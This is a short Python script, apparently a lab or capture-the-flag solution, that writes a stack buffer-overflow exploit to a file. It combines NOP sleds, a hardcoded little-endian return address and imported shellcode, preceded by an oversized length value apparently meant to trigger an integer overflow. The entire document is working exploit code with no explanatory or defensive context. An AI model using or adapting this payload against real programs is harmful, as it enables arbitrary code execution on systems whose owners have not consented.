import struct
from shellcode import shellcode

r_address=0xfffe720c
nops1 = b'\x90'*44
nops2 = b'\x90'*68
operate_buffer = 0xfffe7214
address = struct.pack('<I',operate_buffer)
payload = struct.pack('44s',nops1) +address+ struct.pack('68s',nops2)+ struct.pack('23s x',shellcode)
with open('tmp','wb') as file:
    file.write(struct.pack('<I',1073741825))
    file.write(payload)